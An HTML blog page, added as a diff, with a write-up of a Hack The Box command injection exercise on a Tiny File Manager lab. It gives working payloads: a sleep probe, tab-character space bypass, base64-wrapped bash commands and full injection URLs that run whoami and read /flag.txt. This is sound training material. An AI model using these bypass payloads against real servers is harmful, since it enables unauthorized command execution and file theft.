@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HTB | Command Injection Skills Assessment – Evert van Noort</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:ital,wght@0,400;0,500;1,400&family=Lora:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0e0f11;
+      --surface: #16181c;
+      --border: #252830;
+      --text: #d4d6db;
+      --muted: #6b7080;
+      --accent: #00ff9d;
+      --accent-dim: rgba(0,255,157,0.08);
+      --accent-mid: rgba(0,255,157,0.18);
+      --red: #ff4d6d;
+      --yellow: #ffd166;
+      --code-bg: #0a0c0f;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Lora', Georgia, serif;
+      font-size: 17px;
+      line-height: 1.8;
+      min-height: 100vh;
+    }
+
+    /* ── HEADER ── */
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 2rem 0;
+      animation: fadeDown 0.6s ease both;
+    }
+
+    .header-inner {
+      max-width: 760px;
+      margin: 0 auto;
+      padding: 0 2rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .site-label {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--muted);
+    }
+
+    .site-label span {
+      color: var(--accent);
+    }
+
+    /* ── MAIN ── */
+    main {
+      max-width: 760px;
+      margin: 0 auto;
+      padding: 4rem 2rem 6rem;
+    }
+
+    /* ── META ── */
+    .meta {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 0.5rem 1rem;
+      margin-bottom: 2.5rem;
+      animation: fadeUp 0.6s 0.1s ease both;
+    }
+
+    .tag {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      padding: 0.25rem 0.7rem;
+      border-radius: 2px;
+      border: 1px solid var(--accent);
+      color: var(--accent);
+    }
+
+    .meta-sep {
+      color: var(--border);
+    }
+
+    .meta-text {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.8rem;
+      color: var(--muted);
+      letter-spacing: 0.04em;
+    }
+
+    /* ── TITLE ── */
+    h1 {
+      font-family: 'Syne', sans-serif;
+      font-size: clamp(2rem, 5vw, 2.8rem);
+      font-weight: 800;
+      line-height: 1.15;
+      letter-spacing: -0.02em;
+      color: #fff;
+      margin-bottom: 1rem;
+      animation: fadeUp 0.6s 0.15s ease both;
+    }
+
+    .subtitle {
+      font-family: 'Lora', serif;
+      font-style: italic;
+      font-size: 1.05rem;
+      color: var(--muted);
+      margin-bottom: 3.5rem;
+      padding-bottom: 3rem;
+      border-bottom: 1px solid var(--border);
+      animation: fadeUp 0.6s 0.2s ease both;
+    }
+
+    /* ── BODY CONTENT ── */
+    .content {
+      animation: fadeUp 0.6s 0.3s ease both;
+    }
+
+    .content p {
+      margin-bottom: 1.6rem;
+      color: var(--text);
+    }
+
+    /* ── SECTION HEADINGS ── */
+    h2 {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin: 3rem 0 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+
+    h2::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    /* ── CODE BLOCKS ── */
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--accent);
+      border-radius: 4px;
+      padding: 1.25rem 1.5rem;
+      overflow-x: auto;
+      margin: 1.5rem 0;
+      position: relative;
+    }
+
+    pre code {
+      font-family: 'DM Mono', 'Fira Code', monospace;
+      font-size: 0.82rem;
+      line-height: 1.7;
+      color: #a8d8c0;
+      white-space: pre;
+    }
+
+    /* terminal prompt style */
+    pre.terminal {
+      background: #070809;
+      border-left-color: var(--yellow);
+    }
+
+    pre.terminal code {
+      color: #b8c4b0;
+    }
+
+    /* URL style */
+    pre.url {
+      border-left-color: var(--red);
+    }
+
+    pre.url code {
+      color: #f0a0b0;
+      word-break: break-all;
+      white-space: pre-wrap;
+    }
+
+    .code-label {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.65rem;
+      font-weight: 700;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 0.4rem;
+      margin-top: 1.8rem;
+    }
+
+    /* inline code */
+    code {
+      font-family: 'DM Mono', monospace;
+      font-size: 0.83em;
+      background: var(--accent-dim);
+      color: var(--accent);
+      padding: 0.1em 0.4em;
+      border-radius: 3px;
+    }
+
+    pre code { background: none; padding: 0; color: inherit; }
+
+    /* ── CALLOUT ── */
+    .callout {
+      background: var(--accent-dim);
+      border: 1px solid var(--accent-mid);
+      border-radius: 4px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+      font-size: 0.93rem;
+      color: #a0e8c8;
+    }
+
+    .callout strong {
+      font-family: 'Syne', sans-serif;
+      font-size: 0.7rem;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--accent);
+      display: block;
+      margin-bottom: 0.4rem;
+    }
+
+    /* ── IMAGE PLACEHOLDER ── */
+    .img-placeholder {
+      border: 1px dashed var(--border);
+      border-radius: 4px;
+      padding: 2.5rem;
+      text-align: center;
+      color: var(--muted);
+      font-family: 'Syne', sans-serif;
+      font-size: 0.78rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin: 2rem 0;
+      background: var(--surface);
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 2rem;
+      text-align: center;
+      font-family: 'Syne', sans-serif;
+      font-size: 0.72rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--muted);
+    }
+
+    /* ── ANIMATIONS ── */
+    @keyframes fadeDown {
+      from { opacity: 0; transform: translateY(-10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ── SCROLLBAR ── */
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+    @media (max-width: 600px) {
+      main { padding: 2.5rem 1.25rem 4rem; }
+      h1 { font-size: 1.8rem; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <p class="site-label">Evert van Noort &mdash; <span>Security Writeups</span></p>
+  </div>
+</header>
+
+<main>
+
+  <div class="meta">
+    <span class="tag">Hack The Box</span>
+    <span class="tag">Command Injection</span>
+    <span class="meta-sep">·</span>
+    <span class="meta-text">Evert van Noort</span>
+    <span class="meta-sep">·</span>
+    <!-- <span class="meta-text">2 min read</span> -->
+  </div>
+
+  <h1>Command Injection<br>Skills Assessment</h1>
+
+  <p class="subtitle">Exploiting a blind command injection vulnerability through a file manager interface using filter bypass techniques.</p>
+
+  <div class="content">
+
+    <!-- RECON -->
+    <h2>Reconnaissance</h2>
+
+    <p>For this skills assessment we are provided with an IP address and credentials to log into a webpage. Doing so, we land on the <strong>Tiny File Manager</strong> page.</p>
+
+    <p>From the folder structure we can determine that the server runs on a Unix system. The file manager allows us to view, copy and move files around the server. In some situations we are confronted with the error <em>"Malicious request denied!"</em> — a message that can potentially reflect the output of our injection attempts.</p>
+
+    <p>After examining the URL structure, we expect the back-end command to resemble something like:</p>
+
+    <div class="code-label">Inferred back-end PHP</div>
+    <pre><code>php shell_exec("mv " . $_GET['from'] . " " . $_GET['to']);</code></pre>
+
+    <!-- TESTING -->
+    <h2>Confirming the Vulnerability</h2>
+
+    <p>We test the parameters with a <code>sleep</code> command, similar to time-based SQL injection:</p>
+
+    <div class="code-label">Initial probe</div>
+    <pre><code>;sleep 5</code></pre>
+
+    <p>We find that spaces are filtered. To bypass this, we substitute the tab character (<code>%09</code>) in their place:</p>
+
+    <div class="code-label">Time-based blind injection</div>
+    <pre class="url"><code>http://154.57.164.73:31564/index.php?to=%3Bsleep%095&amp;from=51459716.txt&amp;finish=1&amp;move=1</code></pre>
+
+    <div class="callout">
+      <strong>Result</strong>
+      The page freezes for exactly 5 seconds, confirming the command injection vulnerability.
+    </div>
+
+    <!-- ENUMERATION -->
+    <h2>Enumeration via Base64 Encoding</h2>
+
+    <p>With spaces filtered, we craft payloads using base64 encoding to avoid problematic characters entirely. First, we encode a <code>whoami</code> command and verify it executes correctly:</p>
+
+    <div class="code-label">Encode the command locally</div>
+    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66🔥]─(3v3r7@Athena)
+╰─>[👾]~ $ echo -n 'whoami' | base64
+d2hvYW1p</code></pre>
+
+    <div class="code-label">Payload structure</div>
+    <pre><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;d2hvYW1p)</code></pre>
+
+    <div class="code-label">Validate locally</div>
+    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66🔥]─(3v3r7@Athena)
+╰─>[👾]~ $ bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;d2hvYW1p)
+3v3r7</code></pre>
+
+    <p>To terminate the preceding command before our injection, we prepend a newline (<code>%0a</code>), semicolon (<code>%3B</code>), or pipe (<code>%7C</code>). The final injection URL looks like:</p>
+
+    <div class="code-label">Whoami via HTTP</div>
+    <pre class="url"><code>http://154.57.164.73:31564/index.php?to=%3Bbash%3C%3C%3C$(base64%09-d%3C%3C%3Cd2hvYW1p)&amp;from=51459716.txt&amp;finish=1&amp;move=1</code></pre>
+
+    <div class="callout">
+      <strong>Result</strong>
+      The output of <code>whoami</code> is reflected in the "Malicious request denied!" error message on the page, confirming code execution.
+    </div>
+
+    <!-- FLAG -->
+    <h2>Capturing the Flag</h2>
+
+    <p>The assessment specifies that the flag is located at <code>/flag.txt</code>, making the final payload straightforward to construct:</p>
+
+    <div class="code-label">Encode the read command</div>
+    <pre class="terminal"><code>╭─[HQ🚀🌐192.168.1.66🔥]─(3v3r7@Athena)
+╰─>[👾]~ $ echo -n 'cat /flag.txt' | base64
+Y2F0IC9mbGFnLnR4dA==</code></pre>
+
+    <div class="code-label">Payload</div>
+    <pre><code>%0abash&lt;&lt;&lt;$(base64%09-d&lt;&lt;&lt;Y2F0IC9mbGFnLnR4dA==)</code></pre>
+
+    <div class="code-label">Final request</div>
+    <pre class="url"><code>http://154.57.164.73:31564/index.php?to=%0abash%3C%3C%3C$(base64%09-d%3C%3C%3CY2F0IC9mbGFnLnR4dA==)&amp;from=51459716.txt&amp;finish=1&amp;move=1</code></pre>
+
+    <div class="callout">
+      <strong>Result</strong>
+      The flag is reflected in the error message. Assessment complete.
+    </div>
+
+    <div class="img-placeholder">[ Screenshot: flag reflected in error message ]</div>
+
+  </div>
+</main>
+
+<footer>
+  &copy; Evert van Noort &mdash; Security Writeups
+</footer>
+
+</body>
+</html>
